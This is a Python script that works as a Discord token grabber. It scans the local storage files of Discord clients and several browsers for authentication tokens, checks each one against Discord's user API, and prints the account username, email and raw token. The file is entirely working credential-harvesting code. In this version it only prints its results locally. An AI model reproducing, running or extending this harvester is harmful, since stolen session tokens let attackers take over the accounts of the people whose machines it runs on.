import requests
import os
import re


TOKEN_PATT_1 = r'mfa\.[\w-]{84}'
TOKEN_PATT_2 = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'

class TokenInspector:
    LOCAL = os.environ['LOCALAPPDATA']
    ROAMING = os.environ['APPDATA']

    def __init__(self):
        self.paths = {'Discord': self.ROAMING + '\\discord',
                      'Discord Canary': self.ROAMING + '\\discordcanary',
                      'Discord PTB': self.ROAMING + '\\discordptb',
                      'Opera': self.ROAMING + '\\Opera Software\\Opera Stable',
                      'Google Chrome': self.LOCAL + '\\Google\\Chrome\\User Data\\Default',
                      'Microsoft Edge': self.LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
                      'Yandex': self.LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
                      'Brave': self.LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
                      }
        
        self.found = {}
        self.search_tokens()

    def validate_token(self, token):
        is_valid, username, email = False, None, None
        URL = 'https://canary.discordapp.com/api/v6/users/@me'
        resp = requests.get(URL, headers={'authorization': token})

        if resp.status_code == 200:
            resp = resp.json()
            
            is_valid = True
            username = resp['username'] + '#' + resp['discriminator']
            email = resp['email']

        return is_valid, username, email

    def search_tokens(self):
        for app, path in self.paths.items():
            self.found[app] = []
            path += '\\Local Storage\\leveldb'

            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.split('.')[-1] in ['log', 'ldb']:
                        with open(path + '\\' + file, errors='ignore') as fh:
                            content = [x for x in fh.readlines()]
                            for line in content:
                                for patt in [TOKEN_PATT_1, TOKEN_PATT_2]:
                                    matches = re.findall(patt, line)
                                    if matches:
                                        for match in matches:
                                            is_valid, username, email = self.validate_token(match)
                                            
                                            if is_valid:
                                                data = {'username': username,
                                                        'email': email,
                                                        'token': match}
                                                
                                                self.found[app].append(data)

    def display(self):
        for app in self.found:
            if self.found[app]:
                print('#' * 20 + f" {app} " + '#' * 20)
            for found in self.found[app]:
                print('Username:', found['username'])
                print('E-Mail:', found['email'])
                print('Token:', found['token'])
                print('\n')
                                    

if __name__ == '__main__':
    tokens = TokenInspector()
    tokens.display()

    input("Press any key to leave the program ...")


    
